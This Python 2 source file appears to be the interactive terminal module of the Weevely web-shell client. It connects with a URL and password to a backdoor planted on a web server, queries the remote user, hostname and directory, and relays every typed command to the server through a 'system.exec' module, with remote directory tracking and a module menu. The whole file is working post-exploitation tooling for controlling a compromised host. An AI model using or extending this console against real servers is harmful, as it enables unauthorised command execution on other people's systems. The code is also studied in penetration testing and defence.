'''
Created on 22/ago/2011

@author: norby
'''

from core.module import ModuleException
import readline, atexit, os, re, shlex

class Terminal():
    
    def __init__( self, moddict, url, password, one_shot = False):

        self.moddict = moddict
        
        self.url = url
        self.password = password
        self.interpreter = 'system.exec'
        self.module_string = ':module'
        self.help_string = ':help'
        self.one_shot = one_shot
        self.history      = os.path.expanduser( '~/.weevely_history' )
        self.completions = {}
        
                
        if not one_shot:
            
            try:
                self.moddict.load('system.exec', url, password)
                self.moddict.load('system.info', url, password)
    
            except ModuleException, e:
                self.interpreter = None
                self.prompt        = "[modules]$ " 
                print '[%s][!] Error loading module: %s' % ('system.exec', e)
                
            else:
                self.username      = self.moddict['system.info'].run("whoami")
                self.hostname      = self.moddict['system.info'].run("hostname")
                self.cwd           = self.moddict['system.info'].run("basedir")
                self.cwd_extract = re.compile( "cd\s+(.+)", re.DOTALL )
            



        try:
            readline.parse_and_bind( 'tab: menu-complete' )
            readline.set_completer( self.__complete )
            readline.read_history_file( self.history )
        except IOError:
            pass

        atexit.register( readline.write_history_file, self.history )


    def loop(self):
        
        while True:
            
            self.prompt        = "[system.exec] %s@%s:%s$ " % (self.username, self.hostname, self.cwd)
            
            cmd       = raw_input( self.prompt )
            cmd       = cmd.strip()
            
            if cmd:
                self.run_single(shlex.split(cmd))
            
    def run_single(self, cmd_split):
            
        output = ''
        if cmd_split[0] == self.module_string:
            if len(cmd_split)==2:
                output = self.run_module(cmd_split[1], [])
            elif len(cmd_split)==3:
                output =  self.run_module(cmd_split[1], [ cmd_split[2] ])
            elif len(cmd_split)>3:
                output =  self.run_module(cmd_split[1], cmd_split[2:])
            else:
                print '[!] Error specify module name'
                
        elif cmd_split[0] == self.help_string:
            
            print ''
            for mod_name in self.moddict.module_info:
                if self.moddict.module_info[mod_name][0]:
                    print "%s: %s" % (mod_name, self.moddict.module_info[mod_name][1])
            
            
        elif cmd_split[0] != self.module_string:
        
            cmd = ' '.join(cmd_split)
        
            if not self.one_shot: 
                if self.__handleDirectoryChange(cmd) == False:
                    readline.add_history(cmd)
                    cmd = "cd %s && %s" % ( self.cwd, cmd )  
                else:
                    cmd = "cd %s" % ( self.cwd )     
                    
            output = self.run_module('system.exec', [ cmd ])  
            
        if output:
            print output
    


    def __handleDirectoryChange( self, cmd ):
        cd  = self.cwd_extract.findall(cmd)
        
        if cd != None and len(cd) > 0:    
            cwd  = cd[0].strip()
            path = self.cwd
            if cwd[0] == '/':
                path = cwd
            elif cwd == '..':
                dirs = path.split('/')
                dirs.pop()
                path = '/'.join(dirs)
            elif cwd == '.':
                pass
            elif cwd[0:3] == '../':
                path = cwd.replace( '../', path )
            elif cwd[0:2] == './':
                path = cwd.replace( './', path )
            else:
                path = (path + "/" + cwd).replace( '//', '/' ) 
            
            exists = self.run_module('system.exec', [ "( [ -d '%s' ] && echo 1 ) || echo 0" % path ])
            if exists == "1":
                self.cwd = path
                    
            else:
                print "[!] Directory '%s' does not exist or is not accessible." % path

            return True

        return False

    def __complete( self, text, state ):
        try:
            matches = self.completions[text]
        except KeyError:
            matches = []
            items   = readline.get_current_history_length()
            for i in range( items ):
                item = readline.get_history_item(i)
                if item != None and text in item:
                    matches.append(item)
        
            self.completions[text] = matches
        
        try:
            return matches[state]
        except IndexError:
            return None


    def run_module(self, module_name, module_arguments):
        
        if module_name not in self.moddict.module_info.keys():
            print '[%s][!] Error module not found' % (module_name)
        else:
            try:
                self.moddict.load(module_name, self.url, self.password)
            except ModuleException, e:
                print '[%s][!] Error while loading: %s' % (module_name, e)   
            
            else: 
                if self.moddict[module_name].len_arguments != len(module_arguments): 
                    print '[%s][!] Error module needs %i arguments (not %i), printing documentation:\n' % (module_name, self.moddict[module_name].len_arguments, len(module_arguments))
                    if self.moddict.module_info[module_name][0]: print '%s: %s' % (module_name, self.moddict.module_info[module_name][1])
                
                else:
                    try:
                        return self.moddict[module_name].run(*module_arguments)
                    except ModuleException, e:
                        print '[%s][!] Error: %s' % (module_name, e) 
        
      
    
    
    